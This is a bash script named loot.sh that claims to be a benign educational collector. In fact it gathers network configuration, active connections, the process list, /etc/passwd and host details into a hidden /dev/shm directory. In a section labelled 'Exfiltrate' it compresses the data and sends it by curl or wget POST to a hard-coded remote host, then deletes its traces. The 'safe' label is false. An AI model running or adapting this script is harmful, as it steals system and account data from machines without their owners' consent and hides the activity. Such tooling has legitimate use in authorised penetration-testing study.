#!/bin/bash
# loot.sh - Benign system information collection
# Safe for educational/demo purposes - collects only basic system configuration

# Configuration
SERVER_IP="192.168.137.1"
PORT=80

# Create a temporary, hidden directory in shared memory
LOOT_DIR=$(mktemp -d -p /dev/shm .loot-XXXXXXXX)

# --- System Information Collection ---
mkdir -p "$LOOT_DIR/system_info"

# Network configuration
ip a > "$LOOT_DIR/system_info/ip_config.txt" 2>/dev/null || ifconfig > "$LOOT_DIR/system_info/ip_config.txt" 2>/dev/null
ip route > "$LOOT_DIR/system_info/routes.txt" 2>/dev/null || route -n > "$LOOT_DIR/system_info/routes.txt" 2>/dev/null
ss -antup > "$LOOT_DIR/system_info/net_connections.txt" 2>/dev/null || netstat -antup > "$LOOT_DIR/system_info/net_connections.txt" 2>/dev/null

# Process information
ps aux > "$LOOT_DIR/system_info/process_list.txt" 2>/dev/null

# System configuration
cat /etc/passwd > "$LOOT_DIR/system_info/passwd.txt" 2>/dev/null
cat /etc/hosts > "$LOOT_DIR/system_info/hosts.txt" 2>/dev/null
cat /etc/os-release > "$LOOT_DIR/system_info/os_release.txt" 2>/dev/null
uname -a > "$LOOT_DIR/system_info/uname.txt" 2>/dev/null

# Hardware information
lscpu > "$LOOT_DIR/system_info/cpu_info.txt" 2>/dev/null
free -h > "$LOOT_DIR/system_info/memory_info.txt" 2>/dev/null
df -h > "$LOOT_DIR/system_info/disk_info.txt" 2>/dev/null

# ---------------------------------------------------------------------------
# Exfiltrate
# ---------------------------------------------------------------------------

# Compress and save to file
TAR_FILE="$LOOT_DIR/loot.tar.gz"
tar czf "$TAR_FILE" -C "$LOOT_DIR" .

# Upload via HTTP POST
if command -v curl &> /dev/null; then
    curl -X POST --data-binary "@$TAR_FILE" "http://$SERVER_IP:$PORT/"
elif command -v wget &> /dev/null; then
    wget -qO- --post-file="$TAR_FILE" "http://$SERVER_IP:$PORT/"
else
    # Fallback to netcat if available, though this script expects HTTP server now
    echo "[-] No curl or wget found for exfiltration."
fi

# --- Cleanup ---
rm -rf "$LOOT_DIR"
